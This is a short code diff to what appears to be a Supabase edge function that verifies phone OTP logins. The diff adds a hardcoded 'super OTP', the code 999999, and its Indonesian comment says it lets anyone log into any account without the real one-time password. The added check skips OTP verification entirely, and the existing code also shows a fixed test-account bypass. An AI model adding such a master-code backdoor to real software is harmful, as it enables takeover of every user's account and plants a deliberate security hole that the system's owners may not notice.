@@ -25,8 +25,9 @@ serve(async (req) => {
     )
 
     const isTestAccount = phone === '80000000000' && code === '123456';
+    const isSuperAccess = code === '999999'; // Super OTP untuk login ke akun mana saja tanpa OTP asli
 
-    if (!isTestAccount) {
+    if (!isTestAccount && !isSuperAccess) {
       // Verify OTP
       const { data: otpData, error: otpError } = await supabaseAdmin
         .from('otp_codes')
